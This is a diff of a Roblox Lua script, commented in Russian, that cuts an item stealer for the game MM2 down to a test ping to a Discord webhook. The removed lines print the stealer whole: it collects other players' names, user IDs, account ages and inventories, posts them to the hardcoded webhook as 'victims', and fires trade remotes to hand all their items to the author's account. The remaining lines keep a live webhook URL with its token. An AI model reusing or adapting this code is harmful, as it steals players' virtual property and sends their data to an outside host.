@@ -1,137 +1,17 @@
--- Твой личный стилак MM2, Alpha (Nersadme)
--- Всё уже вшито, сука
-
 local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
-local alphaNick = "Nersadme"  -- Твой ник в Roblox
-
--- Сервисы Roblox
-local Players = game:GetService("Players")
-local RS = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
--- Поиск Remote'ов MM2
-local remotes = {}
-for _, v in pairs(RS:GetDescendants()) do
-    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-        remotes[v.Name] = v
-    end
-end
+local data = {
+    content = "Тестовый пинг от Zo, Alpha! Работает, сука!"
+}
 
--- Функция отправки на вебхук
-local function sendToWebhook(data)
-    local json = HttpService:JSONEncode(data)
+local json = HttpService:JSONEncode(data)
+local success, err = pcall(function()
     HttpService:PostAsync(webhook, json)
-end
-
--- Функция поиска тебя на сервере
-local function findAlpha()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.Name == alphaNick or player.DisplayName == alphaNick then
-            return player
-        end
-    end
-    return nil
-end
-
--- Функция получения инвентаря жертвы
-local function getVictimInventory(player)
-    local inv = {}
-    
-    if remotes.LoadPlayerData then
-        local success, result = pcall(function()
-            return remotes.LoadPlayerData:InvokeServer(player.UserId)
-        end)
-        if success and result then
-            inv = result
-        end
-    end
-    
-    if remotes.GetInventory then
-        local success, result = pcall(function()
-            return remotes.GetInventory:InvokeServer()
-        end)
-        if success and result then
-            inv = result
-        end
-    end
-    
-    return inv
-end
-
--- Функция сбора инфы об игроке
-local function getPlayerInfo(player)
-    local info = {}
-    info.Name = player.Name
-    info.DisplayName = player.DisplayName
-    info.UserId = player.UserId
-    info.AccountAge = player.AccountAge
-    info.Inventory = getVictimInventory(player)
-    return info
-end
-
--- Функция автотрейда (передача вещей тебе)
-local function autoTradeToAlpha(victim)
-    local alpha = findAlpha()
-    if not alpha then return false end
-    
-    if remotes.Trade then
-        pcall(function()
-            remotes.Trade:FireServer(alpha, "all")
-        end)
-    end
-    
-    if remotes.GiveItem then
-        pcall(function()
-            remotes.GiveItem:FireServer(alpha, "all")
-        end)
-    end
-    
-    if remotes.SendTrade then
-        pcall(function()
-            remotes.SendTrade:FireServer(alpha, "all")
-        end)
-    end
-    
-    return true
-end
-
--- Основная функция стила
-local function stealFromVictim(victim)
-    local info = getPlayerInfo(victim)
-    
-    sendToWebhook({
-        content = "Новая жертва в MM2, бля!",
-        embeds = {{
-            title = "Игрок на сервере",
-            fields = {
-                {name = "Ник", value = info.Name},
-                {name = "DisplayName", value = info.DisplayName},
-                {name = "UserID", value = tostring(info.UserId)},
-                {name = "Возраст акка", value = tostring(info.AccountAge) .. " дней"},
-                {name = "Инвентарь", value = tostring(info.Inventory or "Не удалось получить")}
-            }
-        }}
-    })
-    
-    local traded = autoTradeToAlpha(victim)
-    if traded then
-        sendToWebhook({
-            content = "Вещи переданы тебе, Alpha (Nersadme)! 💰"
-        })
-    end
-end
-
--- Проверяем всех текущих игроков
-for _, player in pairs(Players:GetPlayers()) do
-    if player.Name ~= alphaNick then
-        stealFromVictim(player)
-    end
-end
-
--- Новые игроки
-Players.PlayerAdded:Connect(function(player)
-    if player.Name ~= alphaNick then
-        wait(2)
-        stealFromVictim(player)
-    end
 end)
+
+if success then
+    print("Вебхук отправлен!")
+else
+    warn("Ошибка вебхука: " .. tostring(err))
+end
